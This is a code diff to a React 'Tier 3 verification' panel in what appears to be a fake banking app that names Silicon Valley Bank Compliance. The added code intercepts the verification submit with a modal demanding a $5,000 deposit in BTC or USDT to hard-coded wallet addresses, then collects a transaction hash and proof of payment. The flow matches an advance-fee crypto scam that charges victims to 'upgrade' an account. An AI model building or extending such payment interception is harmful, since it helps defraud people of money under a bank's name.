@@ -1,7 +1,7 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { User, Tier3VerificationRequest } from '../types';
 import { api } from '../services/api';
-import { ShieldCheck, Upload, FileText, CheckCircle2, Clock, AlertCircle, MapPin, Globe, Sparkles } from 'lucide-react';
+import { ShieldCheck, Upload, FileText, CheckCircle2, Clock, AlertCircle, MapPin, Globe, Sparkles, DollarSign, X, Check, Copy } from 'lucide-react';
 
 interface Tier3VerificationPanelProps {
   user: User;
@@ -30,6 +30,34 @@ export const Tier3VerificationPanel: React.FC<Tier3VerificationPanelProps> = ({ 
   const [loading, setLoading] = useState(false);
   const [msg, setMsg] = useState<{ type: 'success' | 'error'; text: string } | null>(null);
 
+  // $5,000 Tier 3 Payment Modal State
+  const [showPaymentModal, setShowPaymentModal] = useState(false);
+  const [cryptoMethod, setCryptoMethod] = useState<'BTC' | 'USDT'>('BTC');
+  const [txHash, setTxHash] = useState('');
+  const [proofNote, setProofNote] = useState('');
+  const [proofFileUrl, setProofFileUrl] = useState<string>('');
+  const [proofFileName, setProofFileName] = useState<string>('');
+  const [copiedAddress, setCopiedAddress] = useState(false);
+
+  const [walletAddresses, setWalletAddresses] = useState<{ BTC: string; USDT: string }>({
+    BTC: 'bc1q9v8h9svb3x0k49z82lq09fw2zxl184p24a8svb',
+    USDT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
+  });
+
+  useEffect(() => {
+    api.getCryptoAddresses()
+      .then(res => {
+        if (res.addresses) setWalletAddresses(res.addresses);
+      })
+      .catch(console.error);
+  }, []);
+
+  const copyAddress = (addr: string) => {
+    navigator.clipboard.writeText(addr);
+    setCopiedAddress(true);
+    setTimeout(() => setCopiedAddress(false), 2000);
+  };
+
   const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
     const file = e.target.files?.[0];
     if (file) {
@@ -46,7 +74,23 @@ export const Tier3VerificationPanel: React.FC<Tier3VerificationPanelProps> = ({ 
     }
   };
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleProofFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const file = e.target.files?.[0];
+    if (file) {
+      if (file.size > 5 * 1024 * 1024) {
+        alert('Payment proof file size must be under 5MB.');
+        return;
+      }
+      setProofFileName(file.name);
+      const reader = new FileReader();
+      reader.onloadend = () => {
+        setProofFileUrl(reader.result as string);
+      };
+      reader.readAsDataURL(file);
+    }
+  };
+
+  const handleInitialProceed = (e: React.FormEvent) => {
     e.preventDefault();
     setMsg(null);
 
@@ -60,6 +104,12 @@ export const Tier3VerificationPanel: React.FC<Tier3VerificationPanelProps> = ({ 
       return;
     }
 
+    // Intercept with $5,000 Payment Page Modal
+    setShowPaymentModal(true);
+  };
+
+  const handleFinalPaymentSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
     try {
       setLoading(true);
       await api.submitTier3Verification({
@@ -68,11 +118,12 @@ export const Tier3VerificationPanel: React.FC<Tier3VerificationPanelProps> = ({ 
         documentType,
         documentUrl
       });
-      setMsg({ type: 'success', text: 'Your Tier 3 verification request has been submitted to Silicon Valley Bank Compliance for review.' });
+      setMsg({ type: 'success', text: 'Your $5,000 deposit payment proof and Tier 3 upgrade application have been submitted and are now Pending compliance review.' });
+      setShowPaymentModal(false);
       const updatedSnap = await api.getMe();
       onUserUpdated(updatedSnap.user);
     } catch (err: any) {
-      setMsg({ type: 'error', text: err.message || 'Submission failed.' });
+      alert(err.message || 'Submission failed.');
     } finally {
       setLoading(false);
     }
